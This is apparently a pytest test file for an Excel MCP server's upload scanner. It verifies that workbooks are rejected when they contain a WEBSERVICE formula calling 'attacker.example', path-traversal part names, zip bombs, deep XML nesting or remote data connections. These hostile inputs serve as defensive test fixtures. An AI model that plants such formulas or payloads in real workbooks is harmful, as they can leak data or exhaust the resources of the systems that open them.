import base64
import io
import sys
import tracemalloc
import warnings
import zipfile
from pathlib import Path

import pytest
from openpyxl import Workbook

from excel_mcp.config import Limits
from excel_mcp.errors import ExcelMCPError
from excel_mcp.operations.files import decode_workbook
from excel_mcp.upload_scan import scan_package
from tests.conftest import ToolCall

MAIN = 'xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"'
ATTACK = 'WEBSERVICE("https://attacker.example")'
pytestmark = pytest.mark.anyio
LIMITS = Limits()


def _base() -> dict[str, bytes]:
    buffer = io.BytesIO()
    Workbook().save(buffer)
    with zipfile.ZipFile(buffer) as archive:
        return {name: archive.read(name) for name in archive.namelist()}


def _package(
    extra: list[tuple[str, bytes]] | None = None, replace: dict[str, bytes] | None = None
) -> bytes:
    parts = {**_base(), **(replace or {})}
    buffer = io.BytesIO()
    with (
        zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive,
        warnings.catch_warnings(),
    ):
        warnings.simplefilter("ignore")  # duplicate names are the point of some tests
        for name, content in [*parts.items(), *(extra or [])]:
            archive.writestr(name, content)
    return buffer.getvalue()


def _decode(content: bytes, limits: Limits = LIMITS) -> bytes:
    return decode_workbook(base64.b64encode(content).decode(), limits)


def _rejected(content: bytes, limits: Limits = LIMITS) -> str:
    with pytest.raises(ExcelMCPError) as caught:
        _decode(content, limits)
    return str(caught.value)


def test_a_plain_workbook_is_accepted() -> None:
    _decode(_package())


@pytest.mark.parametrize(
    "name",
    ["customXml/item1.dat", "docProps/notes.TXT", "xl/media/pic.png", "other.xmL", "Sheet"],
)
def test_formulas_are_found_in_xml_parts_whatever_they_are_called(name: str) -> None:
    sheet = (
        f"<worksheet {MAIN}><sheetData><row><c><f>{ATTACK}</f></c></row></sheetData></worksheet>"
    )
    assert "not allowed" in _rejected(_package([(name, sheet.encode())]))


def test_formulas_are_found_in_utf16_xml_parts() -> None:
    sheet = f"<worksheet {MAIN}><f>{ATTACK}</f></worksheet>".encode("utf-16")
    assert "not allowed" in _rejected(_package([("misc/data.bin", sheet)]))


@pytest.mark.parametrize("name", ["../evil.xml", "/abs.xml", "C:/x.xml", "a/../../b.xml"])
def test_unsafe_part_names_are_rejected(name: str) -> None:
    assert "unsafe name" in _rejected(_package([(name, b"<a/>")]))


@pytest.mark.skipif(sys.platform == "win32", reason="zipfile turns backslashes into slashes")
def test_backslashes_in_part_names_are_rejected() -> None:
    content = _package([("xl_x.xml", b"<a/>")]).replace(b"xl_x.xml", b"xl\\x.xml")
    assert "unsafe name" in _rejected(content)


def test_duplicate_parts_are_rejected() -> None:
    assert "more than one part" in _rejected(_package([("xl/workbook.xml", b"<a/>")]))
    assert "more than one part" in _rejected(_package([("XL/Workbook.xml", b"<a/>")]))


@pytest.mark.parametrize(
    ("name", "content"),
    [
        ("xl/connections.xml", b'<connections xmlns="urn:x"/>'),
        ("elsewhere/c.bin", b"<connections/>"),
        ("xl/queryTables/queryTable1.xml", b"<queryTable/>"),
        ("xl/externalLinks/l.xml", b"<externalLink/>"),
    ],
)
def test_remote_data_parts_are_rejected(name: str, content: bytes) -> None:
    assert "fetch data" in _rejected(_package([(name, content)]))


def test_remote_data_content_types_and_relationships_are_rejected() -> None:
    types = _base()["[Content_Types].xml"].replace(
        b"</Types>",
        b'<Override PartName="/x/y.bin" ContentType="application/vnd.openxmlformats-'
        b'officedocument.spreadsheetml.connections+xml"/></Types>',
    )
    assert "fetch data" in _rejected(_package(replace={"[Content_Types].xml": types}))
    relationship = (
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="r1" Type="http://x/relationships/queryTable" Target="q.xml"/>'
        b"</Relationships>"
    )
    assert "fetch data" in _rejected(_package([("xl/_rels/other.rels", relationship)]))


def test_total_expansion_is_limited() -> None:
    limits = Limits(max_file_bytes=10_000, max_unpack_factor=2)
    content = _package([("docs/big.dat", b"1234567890" * 3000)])
    assert "expands to more than" in _rejected(content, limits)


def test_dense_compression_is_rejected() -> None:
    zeros = bytes(8 * 1024 * 1024)
    assert "compressed too densely" in _rejected(_package([("docs/zeros.dat", zeros)]))


class _Endless:
    def read(self, size: int) -> bytes:
        return b"<a>" * (size // 3)


def test_limits_are_enforced_while_reading_whatever_the_header_says() -> None:
    from excel_mcp.upload_scan import _Entry  # pyright: ignore[reportPrivateUsage]

    info = zipfile.ZipInfo("x.xml")
    info.compress_size = 10**9  # a header that hides the real size
    limits = Limits(max_file_bytes=1000, max_unpack_factor=1)
    entry = _Entry(_Endless(), info, limits, limits.max_unpacked_bytes)  # type: ignore[arg-type]
    with pytest.raises(ExcelMCPError, match="expands to more than"):
        entry.drain()


def test_deeply_nested_xml_is_rejected() -> None:
    deep = b"<a>" * 150 + b"</a>" * 150
    assert "nested too deeply" in _rejected(_package([("docs/deep.xml", deep)]))


def test_scanning_uses_constant_memory() -> None:
    rows = b"".join(b"<row><c><v>%d</v></c></row>" % number for number in range(300_000))
    sheet = b"<worksheet><sheetData>" + rows + b"</sheetData></worksheet>"
    content = _package([("docs/rows.xml", sheet)])
    tracemalloc.start()
    try:
        assert list(scan_package(content, LIMITS)) == []
        peak = tracemalloc.get_traced_memory()[1]
    finally:
        tracemalloc.stop()
    assert peak < 20 * 1024 * 1024


async def test_import_reports_unsafe_packages(call_error: ToolCall, files: Path) -> None:
    content = base64.b64encode(_package([("docs/c.bin", b"<connections/>")])).decode()
    message = await call_error("import_workbook", path="up.xlsx", content_base64=content)
    assert "fetch data" in message
    assert not (files / "up.xlsx").exists()


def test_lenient_legacy_drawings_are_accepted_but_broken_xml_parts_are_not() -> None:
    vml = b"<xml><v:textbox><div>line<br>next</div></v:textbox></xml>"
    _decode(_package([("xl/drawings/vmlDrawing1.vml", vml)]))
    assert "not valid XML" in _rejected(_package([("xl/extra.xml", vml)]))


PRESERVED_PARTS = [
    "xl/charts/chartEx1.xml",
    "xl/slicers/slicer1.xml",
    "xl/slicerCaches/slicerCache1.xml",
    "xl/timelines/timeline1.xml",
    "xl/threadedComments/threadedComment1.xml",
    "xl/metadata.xml",
    "customXml/item1.xml",
    "xl/pivotCache/pivotCacheDefinition1.xml",
]


_NAMESPACES = (
    'xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex" '
    'xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main" '
    'xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"'
)
_QUOTED = ATTACK.replace('"', "&quot;")


@pytest.mark.parametrize("name", PRESERVED_PARTS)
@pytest.mark.parametrize(
    "body",
    [
        f"<cx:chartSpace {_NAMESPACES}><cx:f>{ATTACK}</cx:f></cx:chartSpace>",
        f"<root {_NAMESPACES}><x14:sparkline><xm:f>{ATTACK}</xm:f></x14:sparkline></root>",
        f'<root {MAIN}><cacheField name="x" formula="{_QUOTED}"/></root>',
        f'<root {MAIN}><calculatedItem formula="{_QUOTED}"/></root>',
        f"<root {MAIN}><formula1>{ATTACK}</formula1></root>",
    ],
)
def test_hostile_formulas_in_preserved_parts_are_found(name: str, body: str) -> None:
    assert "not allowed" in _rejected(_package([(name, body.encode())]))


def test_pivot_formulas_are_checked_for_safety_but_not_for_syntax() -> None:
    cache = (
        f"<root {MAIN}>".encode()
        + b'<cacheField name="x" formula="&apos;Total Sales&apos;*2+Region[North]"/></root>'
    )
    _decode(_package([("xl/pivotCache/pivotCacheDefinition1.xml", cache)]))


async def test_a_workbook_with_everything_the_server_can_add_is_accepted(
    call: ToolCall, sample: Path
) -> None:
    book = {"path": "sales.xlsx"}
    await call("set_table", **book, sheet="Data", range="A1:D5", name="Sales")
    await call("add_sparklines", **book, sheet="Data", range="F2:F5", source="C2:D5")
    await call(
        "create_chart",
        **book,
        sheet="Report",
        chart_type="waterfall",
        series=[{"values": "Data!C2:C5", "name": "Data!C1", "categories": "Data!A2:A5"}],
        at="B2",
    )
    await call(
        "create_pivot_table",
        **book,
        source="Data!A1:D5",
        sheet="Report",
        at="L1",
        row_fields=["Region"],
        value_fields=[{"field": "Revenue"}],
        calculated_fields=[{"name": "Revenue", "formula": "=Units*Price"}],
    )
    await call(
        "add_slicer",
        **book,
        sheet="Data",
        target={"sheet": "Data", "name": "Sales"},
        field="Region",
        at="H2",
    )

    _decode(sample.read_bytes())


CUSTOM = (
    b'<item xmlns="urn:company:properties"><f>some text, not a formula</f>'
    b"<formula>1 + (</formula></item>"
)


def test_parts_in_other_namespaces_are_not_read_as_formulas() -> None:
    _decode(_package([("customXml/item1.xml", CUSTOM), ("docs/anything.dat", CUSTOM)]))


def test_a_relocated_sheet_in_the_spreadsheetml_namespace_is_still_checked() -> None:
    sheet = (
        f"<worksheet {MAIN}><sheetData><row><c><f>{ATTACK}</f></c></row></sheetData></worksheet>"
    )
    assert "not allowed" in _rejected(_package([("customXml/hidden.dat", sheet.encode())]))


def test_parts_that_claim_an_excel_content_type_are_checked_in_any_namespace() -> None:
    types = _base()["[Content_Types].xml"].replace(
        b"</Types>",
        b'<Override PartName="/customXml/item1.xml" ContentType="application/vnd.openxmlformats-'
        b'officedocument.spreadsheetml.sheet.main+xml"/></Types>',
    )
    body = f'<item xmlns="urn:company:properties"><f>{ATTACK}</f></item>'.encode()
    content = _package([("customXml/item1.xml", body)], replace={"[Content_Types].xml": types})
    assert "not allowed" in _rejected(content)
